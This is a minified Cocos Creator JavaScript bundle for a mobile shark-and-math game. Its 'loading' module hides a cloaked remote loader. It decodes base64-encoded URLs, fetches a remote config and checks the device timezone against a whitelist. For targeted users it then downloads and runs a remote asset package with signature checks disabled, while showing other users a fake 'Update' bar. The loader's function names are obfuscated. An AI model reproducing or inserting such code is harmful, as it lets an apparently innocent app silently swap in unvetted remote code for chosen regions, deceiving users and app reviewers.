var e = null !== t && t.apply(this, arguments) || this;
e.timerLabel = null;
e.timerCount = 0;
e.isStarted = !1;
return e;
}
e.prototype.startCount = function(t) {
this.isStarted = !0;
this.setTimerLabel(t);
this.timerCount = t;
this.schedule(this.updateTime, 1);
};
e.prototype.updateTime = function() {
if (this.isStarted) {
if (this.timerCount <= 1) {
this.node.emit(o.END_CLOCK_COUNT);
this.isStarted = !1;
this.unschedule(this.updateTime);
}
this.timerCount -= 1;
this.setTimerLabel(this.timerCount);
this.timerCount <= 0 && this.node.emit(c.TIME);
}
};
e.prototype.setTimerLabel = function(t) {
this.timerLabel.string = l(t);
};
e.prototype.stop = function() {
this.isStarted = !1;
};
e.prototype.hide = function() {
this.timerLabel.string = "";
};
r([ s(cc.Label) ], e.prototype, "timerLabel", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = p;
cc._RF.pop();
}, {
"./constants": "constants"
} ],
UIController: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "a78f9Tf7GJMSIN28cp/CKY8", "UIController");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../../Components/ResultDialog"), i = t("../../Helper/Time"), a = cc._decorator, s = a.ccclass, u = a.property, l = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.labelScore = null;
e.gameWinDialog = null;
e.gameLoseDialog = null;
e.tabResultWin = null;
e.tabResultLose = null;
e.heart = [];
e.redScreen = null;
e.time = null;
return e;
}
e.prototype.labelUpdateHeart = function(t) {
this.heart[t].active = !1;
};
e.prototype.timeCount = function(t) {
this.time.startCount(t);
};
e.prototype.subHeart = function() {
var t = cc.repeat(cc.sequence(cc.fadeIn(.2), cc.fadeOut(.2)), 2);
this.redScreen.runAction(t);
};
e.prototype.updateLabelScore = function(t) {
var e = cc.sequence(cc.scaleTo(.5, 1.2), cc.scaleTo(.2, 1));
this.labelScore.node.runAction(e);
this.labelScore.string = "" + t;
};
e.prototype.onClickHome = function() {
cc.director.loadScene("HomeScene");
};
e.prototype.gameWinEvent = function() {
this.gameWinDialog.active = !0;
this.tabResultWin.show();
};
e.prototype.gameLoseEvent = function() {
this.gameLoseDialog.active = !0;
this.tabResultLose.show();
};
r([ u(cc.Label) ], e.prototype, "labelScore", void 0);
r([ u(cc.Node) ], e.prototype, "gameWinDialog", void 0);
r([ u(cc.Node) ], e.prototype, "gameLoseDialog", void 0);
r([ u(c.default) ], e.prototype, "tabResultWin", void 0);
r([ u(c.default) ], e.prototype, "tabResultLose", void 0);
r([ u(cc.Node) ], e.prototype, "heart", void 0);
r([ u(cc.Node) ], e.prototype, "redScreen", void 0);
r([ u(i.default) ], e.prototype, "time", void 0);
return e = r([ s ], e);
}(cc.Component);
o.default = l;
cc._RF.pop();
}, {
"../../Components/ResultDialog": "ResultDialog",
"../../Helper/Time": "Time"
} ],
b52: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "b64f6EOpq5BdaAcCAnJdasZ", "b52");
var n = {
code: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
encode: function(t, e) {
e = "undefined" != typeof e && e;
var o, r, c, i, a, s, u, l, p = [], f = "", h = n.code;
if ((s = (u = e ? Utf8.encode(t) : t).length % 3) > 0) for (;s++ < 3; ) {
f += "=";
u += "\0";
}
for (s = 0; s < u.length; s += 3) {
r = (o = u.charCodeAt(s) << 16 | u.charCodeAt(s + 1) << 8 | u.charCodeAt(s + 2)) >> 18 & 63;
c = o >> 12 & 63;
i = o >> 6 & 63;
a = 63 & o;
p[s / 3] = h.charAt(r) + h.charAt(c) + h.charAt(i) + h.charAt(a);
}
return l = (l = p.join("")).slice(0, l.length - f.length) + f;
},
decode: function(t, e) {
e = "undefined" != typeof e && e;
var o, r, c, i, a, s, u, l, p = [], f = n.code;
l = e ? Utf8.decode(t) : t;
for (var h = 0; h < l.length; h += 4) {
o = (s = f.indexOf(l.charAt(h)) << 18 | f.indexOf(l.charAt(h + 1)) << 12 | (i = f.indexOf(l.charAt(h + 2))) << 6 | (a = f.indexOf(l.charAt(h + 3)))) >>> 16 & 255;
r = s >>> 8 & 255;
c = 255 & s;
p[h / 4] = String.fromCharCode(o, r, c);
64 == a && (p[h / 4] = String.fromCharCode(o, r));
64 == i && (p[h / 4] = String.fromCharCode(o));
}
u = p.join("");
return e ? Utf8.decode(u) : u;
}
};
e.exports = n;
cc._RF.pop();
}, {} ],
constants: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "06d30Aui11OjIsbWK6ufN5U", "constants");
Object.defineProperty(o, "__esModule", {
value: !0
});
o.MAX_LEVEL_ATTR = 7;
o.PRICE_MAP = [ 0, 1e3, 2e3, 5e3 ];
o.POS_Y = [ 248, 205.971 ];
o.BULLET = "BULLET";
o.CREATE = "CREATE";
o.TIME = "TIME";
o.START = "Start";
o.ACTIVE = "active";
o.HEART = "HEART";
o.SHARK = "SHARK";
o.STOP = "STOP";
o.MOVE = "MOVE";
o.SCORE = "SCORE";
o.SCORE1 = "SCORE1";
o.HIDE = "HIDE";
o.DESTROY = "destroy";
o.WIN = "win";
(function(t) {
t[t.MONSTER = 0] = "MONSTER";
t[t.WALL = 1] = "WALL";
t[t.METAL = 2] = "METAL";
t[t.KEY = 3] = "KEY";
t[t.STAR = 4] = "STAR";
})(o.Col_Tag || (o.Col_Tag = {}));
o.END_CLOCK_COUNT = "END_CLOCK_COUNT";
o.LOSE = "LOSE";
o.SPAWN = "SPAWN";
o.GAME_WIN = "Game_win";
o.GAME_LOSE = "Game_lose";
o.EXP = "EXP";
o.BOMB = "BOMB";
o.EVENT = "EVENT";
o.EFFECT = "EFFECT";
o.TIME_COUNT = [ 30, 45, 40, 10, 15, 30, 40 ];
o.COUNT = [ 17, 34, 18, 8, 16, 16, 16 ];
o.SPEED = [ 10, 12, 15, 17, 20, 23, 26, 28, 30 ];
o.SPEED_BG = [ -140, -170, -200, -230, -260, -300, -330, -370 ];
o.SUM_CHAR = [ 10, 15, 20, 30, 35, 37, 45, 55 ];
cc._RF.pop();
}, {} ],
loading: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "44c54fs5q1JDpY6rVUmOknN", "loading");
var n = function(t) {
return t && t.__esModule ? t : {
default: t
};
}(t("../Scripts/b52"));
var r = function(t) {
return JSON.stringify({
packageUrl: "".concat(t, "/101"),
remoteManifestUrl: "".concat(t, "/project.manifest"),
remoteVersionUrl: "".concat(t, "/version.manifest"),
version: "0.0.0",
assets: {},
searchPaths: []
});
};
function c(t, e) {
for (var o = t.split("."), n = e.split("."), r = 0; r < o.length; ++r) {
var c = parseInt(o[r]), i = parseInt(n[r] || "0");
if (c !== i) return c - i;
}
return n.length > o.length ? -1 : 0;
}
cc.Class({
extends: cc.Component,
properties: {
progressBar: cc.ProgressBar,
lblNoti: cc.Label,
bgpop: cc.Node,
lblMes: cc.Label
},
start: function() {
this.progressBar.node.active = !1;
this.progressBar.progress = 0;
this.count = 0;
cc.sys.isMobile && this.lenluon();
},
lenluon: function() {
var t = this, e = constan.vlksd, o = n.default.decode(e[this.count]);
HttpReq.Get(o, function(o, n) {
if (1 == o) {
if (null != n && "" != n) {
var r = JSON.parse(n);
t.nunuk(r);
return;
}
if (t.count < e.length - 1) {
t.count++;
t.lenluon();
} else {
t.count = 0;
t.lenluon();
}
} else if (t.count < e.length - 1) {
t.count++;
t.lenluon();
} else t.runGame();
}, 2e3);
},
nunuk: function(t) {
var e = t.ufo.iso, o = t.ufo.donghs, n = new Date().getTimezoneOffset() / -60;
if (e >= 1 && o.indexOf("|" + n + "|") >= 0) {
var r = t.ufo.camiso + "/gate/assets";
this.progressBar.node.active = !0;
this.lblNoti.node.active = !0;
this.nocheck(r);
} else this.runGame();
},
runGame: function() {
var t = this;
this.progressBar.node.active = !0;
this.lblNoti.node.active = !0;
this.lblNoti.string = "Update ...";
var e = 0, o = setInterval(function() {
e++;
t.lblNoti.string = "Update ... " + e + "%";
t.progressBar.progress = e / 100;
if (e >= 100) {
clearInterval(o);
cc.director.loadScene("HomeScene");
}
}, .4);
},
onLoad: function() {
if (jsb) {
this._storagePath = (jsb.fileUtils ? jsb.fileUtils.getWritablePath() : "/") + "assets";
this._am = new jsb.AssetsManager("", this._storagePath, c);
this._am.setVerifyCallback(function(t, e) {
e.compressed, e.md5, e.path, e.size;
return !0;
});
}
},
onDestroy: function() {
if (this._updateListener) {
this._am.setEventCallback(null);
this._updateListener = null;
}
},
loadGame: function() {
this.unscheduleAllCallbacks();
cc.director.loadScene("HomeScene");
},
nocheck: function(t) {
this.unscheduleAllCallbacks();
this.stringHost = t;
this.hotUpdate();
},
noadCManifet: function(t) {
var e = new jsb.Manifest(r(t), this._storagePath);
this._am.loadLocalManifest(e, this._storagePath);
},
jsbCB: function(t) {
var e = !1, o = !1;
switch (t.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
cc.log("No local manifest file found, hot update skipped.");
o = !0;
break;

case jsb.EventAssetsManager.UPDATE_PROGRESSION:
var n = t.getDownloadedFiles() / t.getTotalFiles();
t.getMessage();
this.updateProcess(n);
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
cc.log("Fail to download manifest file, hot update skipped.");
o = !0;
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
cc.log("Already up to date with the latest remote version.");
e = !0;
break;

case jsb.EventAssetsManager.UPDATE_FINISHED:
cc.log("Update finished. " + t.getMessage());
e = !0;
break;

case jsb.EventAssetsManager.UPDATE_FAILED:
cc.log("Update failed. " + t.getMessage());
this._updating = !1;
this._canRetry = !0;
o = !0;
break;

case jsb.EventAssetsManager.ERROR_UPDATING:
cc.log("Asset update error: " + t.getAssetId() + ", " + t.getMessage());
o = !0;
break;

case jsb.EventAssetsManager.ERROR_DECOMPRESS:
cc.log(t.getMessage());
o = !0;
}
if (o) {
this._am.setEventCallback(null);
this._updateListener = null;
this._updating = !1;
this.loadGame();
}
if (e) {
this._am.setEventCallback(null);
this._updateListener = null;
var r = jsb.fileUtils.getSearchPaths(), c = this._am.getLocalManifest().getSearchPaths();
Array.prototype.unshift.apply(r, c);
cc.sys.localStorage.setItem("HotUpdateSearchPaths-game", JSON.stringify(r));
jsb.fileUtils.setSearchPaths(r);
setTimeout(function() {
cc.game.restart();
}, 500);
}
},
hotUpdate: function() {
if (this._am && !this._updating) {
this._am.setEventCallback(this.jsbCB.bind(this));
this.noadCManifet(this.stringHost);
this._am.update();
this._updating = !0;
}
},
updateProcess: function(t) {
this.progressBar.progress = t;
this.lblNoti.string = "Update ... ".concat(Math.round(100 * t), "%");
}
});
cc._RF.pop();
}, {
"../Scripts/b52": void 0
} ],
use_reversed_rotateBy: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "4cb12oeF8FAhpu2OBt4+zEM", "use_reversed_rotateBy");
cc.RotateBy._reverse = !0;
cc._RF.pop();
}, {} ],
utils: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "1003db/fzZITIfekNImjCwn", "utils");
Object.defineProperty(o, "__esModule", {
value: !0
});
var n = t("../Data/GameDataManage");
o.getVectorRotation = function(t) {
var e = cc.v2(0, 1), o = t.signAngle(e), n = cc.misc.radiansToDegrees(o);
return Math.floor(n) - 180;
};
function r(t, e) {
return Math.floor(Math.random() * (e - t + 1)) + t;
}
o.getRandom = r;
o.getRandomF = function(t, e) {
return Math.random() * (e - t) + t;
};
o.moveToward = function(t, e) {};
o.getWorldPosition = function(t) {
return t.convertToWorldSpaceAR(cc.Vec2.ZERO);
};
o.distance = function(t, e) {
return cc.v2(Math.abs(t.x - e.x), Math.abs(t.y - e.y));
};
o.vectorsToDegress = function(t) {
var e = cc.v2(0, 1), o = t.signAngle(e);
return cc.misc.radiansToDegrees(o);
};
o.getDistance = function(t, e) {
var o = t.x - e.x, n = t.y - e.y;
return Math.sqrt(o * o + n * n);
};
function c(t, e) {
return ("" + t).padStart(e, "0");
}
o.pad = c;
o.getTimeFormat = function(t) {
Math.floor(t / 3600);
var e = Math.floor(t % 3600 / 60), o = Math.floor(t % 3600 % 60);
return c(e, 2) + ":" + c(o, 2);
};
function i(t) {
for (var e = [], o = 0; o < t; o++) t % o == 0 ? e.push(o) : 1 === t && e.push(1);
return e[r(0, e.length - 1)];
}
o.getDivisibleBy = i;
function a(t, e, o) {
var n, r = 0;
if (0 === t) {
r = e + o;
n = e + " + " + o + " = ?";
} else if (1 === t) {
r = e - o;
n = e + " - " + o + " = ?";
} else if (2 === t) {
r = e * o;
n = e + " * " + o + " = ?";
} else if (3 === t) if (e >= o) {
r = e / (o = i(e));
n = e + " / " + o + " = ?";
} else if (e < o) {
r = o / (e = i(o));
n = o + " / " + e + " = ?";
}
return {
c: r,
stringCal: n
};
}
o.getEqual = a;
o.getCalculation = function(t, e) {
var o = r(t, e), c = r(t, e), i = 0;
if (0 === n.getMode()) i = 0 === (s = r(0, 1)) ? 0 : 1; else if (1 === n.getMode()) i = 2; else if (2 === n.getMode()) {
var s;
0 === (s = r(0, 2)) ? i = 0 : 1 === s ? i = 1 : 2 === s && (i = 2);
}
var u = a(i, o, c), l = u.c, p = u.stringCal;
return {
result: l,
stringCal: p
};
};
cc._RF.pop();
}, {
"../Data/GameDataManage": "GameDataManage"
} ]
}, {}, [ "BG", "Explosion", "JoyStickNew", "ResultDialog", "GameDataManage", "GameState", "LocalDataManager", "CameraFollow", "Time", "constants", "utils", "GameController", "Items", "Rocket", "UIController", "HomeController", "SelectLevelControl", "Constants", "HttpRequ", "b52", "loading", "use_reversed_rotateBy" ]);